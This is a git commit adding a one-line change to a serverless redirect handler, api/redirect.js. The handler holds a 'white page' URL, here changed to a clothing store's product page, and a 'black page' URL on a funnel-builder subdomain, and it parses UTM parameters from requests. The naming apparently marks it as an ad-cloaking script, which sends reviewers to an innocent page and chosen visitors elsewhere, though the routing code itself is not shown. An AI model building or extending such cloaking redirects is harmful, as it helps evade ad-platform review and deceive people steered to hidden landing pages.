c21e88e6ac2e72db570380dd32329f4c00537b45
Ahmadfarhan67 <123234895+Ahmadfarhan67@users.noreply.github.com>
2025-01-13 14:52:55 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.theapparelbox.com/products/basic-sweatshirt-8";
+    const whitePageURL = "https://www.sclothers.com/collections/caps/products/mcp113r";
     const blackPageURL = "https://ifrxjwhbvb.myfunnelish.com/imbassd-1735569734063202-1735754211879216";
   
     // Parse the UTM parameters from the request URL
